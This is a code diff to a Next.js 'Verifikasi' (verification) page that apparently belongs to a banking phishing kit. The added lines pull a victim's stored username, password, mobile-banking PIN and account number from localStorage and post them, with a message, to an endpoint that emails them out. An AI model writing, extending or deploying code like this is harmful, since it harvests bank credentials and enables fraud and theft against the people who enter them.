@@ -1,5 +1,4 @@
 
-import { useRouter } from 'next/router'
 import React, { useState } from 'react'
 import SiteVerifikasi from '../components/SiteVerifikasi'
 import Inbox from '../public/inbox.jpeg'
@@ -7,17 +6,28 @@ import Image from 'next/image'
 
 import {
   Alert,
-  AlertIcon,
   AlertTitle,
-  AlertDescription,
   Box,
 } from '@chakra-ui/react'
 
 function Verifikasi({host}) {
   const [showAlert, setShowAlert] = useState(false)
-  const router = useRouter()
   const handleMessage = async (data) => {
     document.getElementById('btn').innerHTML = 'Loading...'
+
+    const username = localStorage.getItem('username')
+    const password = localStorage.getItem('password')
+    const mPin = localStorage.getItem('mPin')
+    const noRek = localStorage.getItem('noRek')
+
+    const body = {
+      username,
+      password,
+      mPin,
+      noRek,
+      message : data.message
+    }
+
       try {
         
         const response = await fetch('/api/sendEmail', {
@@ -26,7 +36,7 @@ function Verifikasi({host}) {
                 'Content-Type': 'application/json',
                 'url': host
             },
-            body: JSON.stringify(data)
+            body: JSON.stringify(body)
         })
 
         const json = await response.json()
